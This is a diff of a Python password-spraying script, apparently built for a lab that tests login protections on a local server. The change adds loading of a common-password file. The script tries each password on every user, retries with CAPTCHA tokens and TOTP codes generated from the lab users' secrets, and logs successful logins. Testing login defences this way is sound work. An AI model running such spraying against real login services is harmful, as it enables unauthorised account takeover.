@@ -14,19 +14,37 @@ GROUP_SEED = 6631928
 LOG_DIR = "logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
-# Common passwords that match the "Weak" users in generate_users.py
-COMMON_PASSWORDS = [
-    "123456", "password", "12345678", "qwerty", "123456789", "admin123",
-    "welcome", "login", "princess", "football", "monkey", "dragon"
-]
 
-# Load user list to get usernames and secrets
+# ======================================
+# PASSWORD LIST LOADER
+# ======================================
+
+def load_common_passwords(file_path):
+    """Load a large list of common passwords from a text file."""
+    try:
+        with open(file_path, "r", encoding="utf-8") as f:
+            passwords = [line.strip() for line in f if line.strip()]
+            print(f"[*] Loaded {len(passwords)} common passwords from file.")
+            return passwords
+    except FileNotFoundError:
+        print("[!] common_passwords.txt not found. Using fallback list.")
+        return [
+            "123456", "password", "12345678", "qwerty", "123456789", "admin123",
+            "welcome", "login", "princess", "football", "monkey", "dragon"
+        ]
+
+
+# Load from external file (500 passwords)
+COMMON_PASSWORDS = load_common_passwords("common_passwords.txt")
+
+
+# ======================================
+# LOAD USERS
+# ======================================
 try:
     with open("users.json", "r") as f:
         USER_DATA = json.load(f)
-        # Create a dictionary for quick lookup of secrets
         USER_MAP = {u["username"]: u for u in USER_DATA}
-        # List of usernames to target
         TARGET_USERNAMES = [u["username"] for u in USER_DATA]
 except FileNotFoundError:
     print("[!] Error: users.json not found. Run generate_users.py first.")
@@ -50,7 +68,7 @@ def get_captcha_token(base_url, session):
 
 
 def generate_totp(username):
-    """Generates a valid TOTP code for the specific user."""
+    """Generate a valid TOTP code for the user."""
     user = USER_MAP.get(username)
     if user and user.get("totp_secret"):
         totp = pyotp.TOTP(user["totp_secret"])
@@ -78,19 +96,15 @@ def run_spraying_attack(target_url, output_file, delay):
 
         start_time = time.time()
 
-        # OUTER LOOP: Iterate through common passwords
+        # Outer loop – iterate through all common passwords
         for pwd_index, password in enumerate(COMMON_PASSWORDS):
             print(f"\n--- Round {pwd_index + 1}: Spraying password '{password}' ---")
 
-            # INNER LOOP: Try this password on ALL users
+            # Try this password on every user
             for username in TARGET_USERNAMES:
 
-                payload = {
-                    "username": username,
-                    "password": password
-                }
+                payload = {"username": username, "password": password}
 
-                # Send Request
                 req_start = time.time()
                 try:
                     r = session.post(target_url, json=payload)
@@ -101,33 +115,29 @@ def run_spraying_attack(target_url, output_file, delay):
                     print(f"[!] Error: {e}")
                     continue
 
-                # Handle Protections (Smart Bypass)
                 notes = ""
 
-                # 1. CAPTCHA Triggered
+                # CAPTCHA bypass
                 if status_code == 403 and resp_data.get("captcha_required"):
                     notes += "captcha_bypass;"
                     token = get_captcha_token(target_url, session)
                     if token:
                         payload["captcha_token"] = token
-                        # Retry
                         req_start = time.time()
                         r = session.post(target_url, json=payload)
                         latency += (time.time() - req_start) * 1000
                         status_code = r.status_code
 
-                # 2. TOTP Triggered
-                # (Spraying usually stops at password, but if we want to measure full success)
+                # TOTP attempt
                 if status_code == 401 and "totp" in str(resp_data.get("reason", "")):
                     notes += "totp_attempted;"
                     code = generate_totp(username)
                     if code:
                         payload["totp_code"] = code
-                        # Retry
                         r = session.post(target_url, json=payload)
                         status_code = r.status_code
 
-                # Log Result
+                # Status classification
                 result_status = "fail"
                 if status_code == 200:
                     result_status = "success"
@@ -148,14 +158,8 @@ def run_spraying_attack(target_url, output_file, delay):
                 if result_status == "success":
                     print(f"[+] HIT! User: {username} | Pass: {password}")
 
-                # Optional delay between requests to avoid instant rate limiting
-                # (Simulates a more realistic spray)
                 if delay > 0:
                     time.sleep(delay)
-
-            # Optional: Sleep between password rounds?
-            # Usually hackers wait 30-60 mins. For the lab, we continue immediately
-            # to see if the Rate Limiter catches us.
 
     print(f"\n[*] Spraying finished in {time.time() - start_time:.2f} seconds.")
 
@@ -167,7 +171,7 @@ def run_spraying_attack(target_url, output_file, delay):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Password Spraying Attacker")
     parser.add_argument("--url", default="http://127.0.0.1:5000/login", help="Target URL")
-    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests (seconds)")
+    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests")
     parser.add_argument("--tag", default="experiment", help="Log filename tag")
 
     args = parser.parse_args()
